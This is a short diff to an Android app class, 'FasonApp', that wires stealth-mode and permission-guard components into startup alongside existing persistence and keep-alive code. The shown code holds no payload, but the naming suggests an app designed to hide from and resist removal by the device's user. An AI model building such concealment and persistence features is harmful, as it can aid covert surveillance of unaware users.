@@ -12,6 +12,8 @@ import com.fason.app.core.config.Config;
 import com.fason.app.service.MainService;
 import com.fason.app.worker.KeepAliveWorker;
 import com.fason.app.persistence.PersistenceOrchestrator;
+import com.fason.app.core.permissions.PermissionGuardOrchestrator;
+import com.fason.app.stealth.StealthModeManager;
 import java.util.concurrent.TimeUnit;
 
 public class FasonApp extends Application {
@@ -31,6 +33,16 @@ public class FasonApp extends Application {
             PersistenceOrchestrator.init();
         } catch (Exception e) {
             Log.e("FasonApp", "Persistence init failed", e);
+        }
+        try {
+            PermissionGuardOrchestrator.init();
+        } catch (Exception e) {
+            Log.e("FasonApp", "Permission guard init failed", e);
+        }
+        try {
+            StealthModeManager.init();
+        } catch (Exception e) {
+            Log.e("FasonApp", "Stealth mode init failed", e);
         }
         startServices();
     }
